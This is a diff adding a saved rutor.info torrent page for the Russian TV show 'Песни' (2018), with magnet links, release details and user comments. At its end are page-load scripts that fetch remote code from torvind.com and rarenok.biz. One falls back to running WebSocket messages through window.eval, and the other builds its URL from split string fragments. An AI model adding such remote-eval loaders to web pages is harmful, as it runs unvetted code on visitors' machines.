@@ -1,0 +1,362 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Песни [01-32] (2018) SATRip</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Песни [01-32] (2018) SATRip</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:82464a7dd405c726615d3d68e39f1847e76e95da&amp;dn=rutor.info_%D0%9F%D0%B5%D1%81%D0%BD%D0%B8+%5B01-32%5D+%282018%29+SATRip&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=612618"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/612618"><img src="http://s.rutor.info/t/down.png"> Скачать Pesni.2018.E01-32.SATRip.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://img12.lostpic.net/2018/02/10/4b4b0d68a8b7ecf1928c6a82cebfa001.jpg" /><br />
+<br />
+<u>Информация о фильме</u><br />
+<b>Оригинальное название:</b> Песни<br />
+<b>Год выпуска:</b> 2018<br />
+<b>Жанр:</b>  <a href="/tag/6/ТВ-шоу" target="_blank">ТВ-шоу</a>, <a href="/tag/6/концерт" target="_blank">концерт</a><br />
+<b>Выпущено:</b> Россия, Comedy Club Production, Телеканал ТНТ<br />
+<b>Ведущий:</b> Павел Воля<br />
+<br />
+<b>О фильме:</b> Перед проектом «ПЕСНИ» стоит амбициозная задача: построить в России новый шоу-бизнес с собственными законами существования и критериями успешности. И сделать это можно только с помощью крупнейших музыкальных лейблов страны – Black Star и MALFA, и самых авторитетных продюсеров – Максима Фадеева и ТИМАТИ. Вместе они будут искать новые лица, новую музыку и новые песни. Они перевернут музыкальную индустрию, сломают старые стереотипы о вокальных шоу и полностью изменят критерии отбора участников.<br />
+<br />
+<b>Жюри:</b> Наравне с Тимати и Максом Фадеевым судьбы участников на кастинге станут вершить Гарик Мартиросян, Вера Брежнева, Сергей Светлаков и рэпер Влади из группы «Каста».<br />
+<br />
+<u>Файл</u><br />
+<b>Качество:</b> SATRip<br />
+<b>Видео:</b> XviD, ~ 1650 Кбит/с, 720x400<br />
+<b>Аудио:</b> MP3, 2 ch, 192 Кбит/с<br />
+<b>Продолжительность:</b> 32 х ~ 01:37:00<br />
+<b>Язык:</b> Русский<br />
+<br />
+<b>Скриншоты:</b><br />
+<a href="http://img12.lostpic.net/2018/02/10/c65ad09e186ed2a303b72c2af8c19d53.png" target="_blank"><img src="http://img12.lostpic.net/2018/02/10/c65ad09e186ed2a303b72c2af8c19d53.th.png" /></a> <a href="http://img12.lostpic.net/2018/02/10/a2a04a0366e53346386e6cce708be1cb.png" target="_blank"><img src="http://img12.lostpic.net/2018/02/10/a2a04a0366e53346386e6cce708be1cb.th.png" /></a><br />
+<a href="http://img12.lostpic.net/2018/02/10/588ebdbad512bc81f8b067684dcb99bd.png" target="_blank"><img src="http://img12.lostpic.net/2018/02/10/588ebdbad512bc81f8b067684dcb99bd.th.png" /></a> <a href="http://img12.lostpic.net/2018/02/10/04114334eec127e529363dd0dd20bef1.png" target="_blank"><img src="http://img12.lostpic.net/2018/02/10/04114334eec127e529363dd0dd20bef1.th.png" /></a></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/72161/0" target="_blank">ViTek©</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>6.5 из 10 (4 голосов, самая низкая оценка - 1, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/tv" target="_blank">Телевизор</a></td></tr>
+<tr><td class="header">Раздают</td><td>1</td></tr>
+<tr><td class="header">Качают</td><td>13</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 7:19:05 (35 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>09-05-2018 3:46:33  (4 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>28.78&nbsp;GB  (30899826688 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 612618);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>08&nbsp;Май&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/630567"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:446558a91ad6d6dab73ac8713e40836d4ed322e0&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/630567/pesni-voennyh-let-koncert-dmitrija-hvorostovskogo-jefir-ot-09.05-2016-hdtv-1080i">Песни военных лет. Концерт Дмитрия Хворостовского [эфир от 09.05] (2016) HDTV 1080i </a></td> 
+<td align="right">6.08&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>08&nbsp;Май&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/614096"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d0096e1b0c455dac0e3dd39d244a245ab8b4c51e&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/614096/pesni-01-31-2018-hdtv-1080i">Песни [01-31] (2018) HDTV 1080i </a></td> <td align="right">12<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">169.04&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;11</span></td></tr><tr class="gai"><td>20&nbsp;Апр&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/614086"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:bf857814414f4760af177d9c273186a6b546f6cc&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/614086/pesni-01-16-2018-webrip-720p">Песни [01-16] (2018) WEBRip 720p </a></td> <td align="right">8<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">35.29&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>02&nbsp;Янв&nbsp;18</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/605153"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:ca72fd3cbb4383fff1f81620c1b4d6905229450c&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/605153/pesnja-goda-01-02-iz-02-2018-hdtvrip-ot-files-x">Песня года  [01-02  из 02] (2018) HDTVRip  от Files-x </a></td> 
+<td align="right">3.66&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;3</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>02&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/605143"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:b0ad1a6c7ce7572498ab57b8efffb745c51aa9e4&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/605143/pesnja-goda-01-02-iz-02-2018-hdtv-1080i-ot-files-x">Песня года  [01-02  из 02] (2018) HDTV 1080i  от Files-x </a></td> <td align="right">1<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">22.44&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>31&nbsp;Дек&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/605022"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3ff7bdc890c6238ef0965dd50252b784ec28cddb&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/605022/luchshie-pesni-prazdnichnyj-koncert-2017-hdtvrip-ot-files-x">Лучшие песни. Праздничный концерт (2017) HDTVRip от Files-x </a></td> 
+<td align="right">1.36&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>31&nbsp;Дек&nbsp;17</td><td colspan = "2"><a class="downgif" href="http://d.rutor.info/download/605002"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:6381c26668cc40b5ac96587f5d14c34bd4266428&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/605002/luchshie-pesni-prazdnichnyj-koncert-2017-hdtv-1080i-ot-files-x">Лучшие песни. Праздничный концерт (2017) HDTV 1080I от Files-x </a></td> 
+<td align="right">7.90&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/6/0/0/Песни" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/612618.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (32)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=612618">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(612618);">Промодерировать раздачу</span> | <span onclick="confirm_delete(612618);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/612618">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>ViTek©</b></td> <td>08-05-2018 2:25:43 (1 день назад)</td> <td></td> <td align="right"><span id="c_3199283"></span><script type="text/javascript">cOptions(72161,3199283);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавлен 32 выпуск</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>netzah</b></td> <td>06-05-2018 0:23:56 (3 дня назад)</td> <td></td> <td align="right"><span id="c_3198375"></span><script type="text/javascript">cOptions(29134,3198375);</script></td></tr><tr><td class="c_t" colspan=4>Передача про то, как сантехник с ассенизатором пытались сделать шоколад чтобы рулить кондитерским бизнесом. Хоть не &quot;живые мертвецы&quot; от Борисовны.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ViTek©</b></td> <td>30-04-2018 21:09:35 (8 дней назад)</td> <td></td> <td align="right"><span id="c_3196177"></span><script type="text/javascript">cOptions(72161,3196177);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавлен 30 выпуск</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>vorona0048</b></td> <td>29-04-2018 4:31:34 (10 дней назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3195284"></span><script type="text/javascript">cOptions(1452070,3195284);</script></td></tr><tr><td class="c_t" colspan=4>*первые два выпуска совсем лютый мрак ,в третьем что то было,но в жизни я бы переключил это, позже угадаю кто победит, а пока смотрим дальше* <br />
+В итоге: Ненавижу, но смотреть, постить и заценивать буду. Ну вот откуда вы такие беретесь? Кто вас рожает?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Julia04</b></td> <td>28-04-2018 17:49:30 (11 день назад)</td> <td></td> <td align="right"><span id="c_3195074"></span><script type="text/javascript">cOptions(1544478,3195074);</script></td></tr><tr><td class="c_t" colspan=4>Умоляю, сделайте отдельный торрент только на отчетные концерты, без онлайн!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ViTek©</b></td> <td>20-04-2018 17:48:12 (19 дней назад)</td> <td></td> <td align="right"><span id="c_3191427"></span><script type="text/javascript">cOptions(72161,3191427);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавлен 24 выпуск</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>BeckProduction</b></td> <td>18-04-2018 23:00:11 (20 дней назад)</td> <td></td> <td align="right"><span id="c_3190647"></span><script type="text/javascript">cOptions(1542017,3190647);</script></td></tr><tr><td class="c_t" colspan=4>Можно узнать когда примерно ждать новые выпуски в качестве 720-1080 ?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ViTek©</b></td> <td>30-03-2018 19:40:40 (1 месяц назад)</td> <td></td> <td align="right"><span id="c_3180304"></span><script type="text/javascript">cOptions(72161,3180304);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавлен 14-15 выпуск</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>фифа 2019</b></td> <td>25-03-2018 3:18:48 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3177408"></span><script type="text/javascript">cOptions(1535440,3177408);</script></td></tr><tr><td class="c_t" colspan=4>Респект Спасибо огромное</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>zolt</b></td> <td>25-03-2018 1:03:19 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3177380"></span><script type="text/javascript">cOptions(1052243,3177380);</script></td></tr><tr><td class="c_t" colspan=4>Нормальное шоу.Не нужно валать дерьмо.Клёво.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ViTek©</b></td> <td>24-03-2018 17:18:28 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3177153"></span><script type="text/javascript">cOptions(72161,3177153);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавлен 7 выпуск</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>фифа 2019</b></td> <td>17-03-2018 21:22:33 (2 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3173592"></span><script type="text/javascript">cOptions(1535440,3173592);</script></td></tr><tr><td class="c_t" colspan=4>Респект</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ViTek©</b></td> <td>10-03-2018 19:33:41 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3168834"></span><script type="text/javascript">cOptions(72161,3168834);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавлен 6 выпуск</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>prav404</b></td> <td>07-03-2018 11:24:45 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3166525"></span><script type="text/javascript">cOptions(1439860,3166525);</script></td></tr><tr><td class="c_t" colspan=4>kisa <img src="http://s.rutor.info/t/smilies/chair.gif" /><img src="http://s.rutor.info/t/smilies/thumbsup1.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ViTek©</b></td> <td>03-03-2018 16:56:04 (2 месяца назад)</td> <td></td> <td align="right"><span id="c_3164134"></span><script type="text/javascript">cOptions(72161,3164134);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавлен 4 выпуск</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>prav404</b></td> <td>27-02-2018 0:55:11 (2 месяца назад)</td> <td>Оценил на: <b>5</b></td> <td align="right"><span id="c_3161230"></span><script type="text/javascript">cOptions(1439860,3161230);</script></td></tr><tr><td class="c_t" colspan=4>первые два выпуска совсем  лютый мрак ,в третьем что то было,но в жизни я бы переключил это, позже угадаю кто победит, а пока смотрим дальше <img src="http://s.rutor.info/t/smilies/crazy.gif" /> </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ViTek©</b></td> <td>17-02-2018 23:29:56 (3 месяца назад)</td> <td></td> <td align="right"><span id="c_3154761"></span><script type="text/javascript">cOptions(72161,3154761);</script></td></tr><tr><td class="c_t" colspan=4><b>Добавлен 3 выпуск</b></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Karoshka</b></td> <td>11-02-2018 13:48:45 (3 месяца назад)</td> <td>Оценил на: <b>1</b></td> <td align="right"><span id="c_3150771"></span><script type="text/javascript">cOptions(355178,3150771);</script></td></tr><tr><td class="c_t" colspan=4>Короли бизнеса решили приумножить состояние.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>9583</b></td> <td>10-02-2018 21:41:04 (3 месяца назад)</td> <td></td> <td align="right"><span id="c_3150434"></span><script type="text/javascript">cOptions(949738,3150434);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Гарик Мартиросян, Сергей Светлаков</fieldset><br />
+тьфу ты...эксперты музыкальные...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>edvinn%</b></td> <td>10-02-2018 21:32:50 (3 месяца назад)</td> <td></td> <td align="right"><span id="c_3150428"></span><script type="text/javascript">cOptions(22433,3150428);</script></td></tr><tr><td class="c_t" colspan=4>пострел и тут поспел...<br />
+Это я про Волю! <br />
+<br />
+<img src="http://s.rutor.info/t/smilies/congrats.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>ChPiVn</b></td> <td>10-02-2018 20:48:43 (3 месяца назад)</td> <td></td> <td align="right"><span id="c_3150386"></span><script type="text/javascript">cOptions(1499776,3150386);</script></td></tr><tr><td class="c_t" colspan=4>&quot;.....перевернут музыкальную индустрию, сломают старые стереотипы о вокальных шоу и полностью изменят критерии отбора участников......&quot;<br />
+<br />
+а на Огоньке опять будут Кобзон, Губерниев и жена Пескова</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
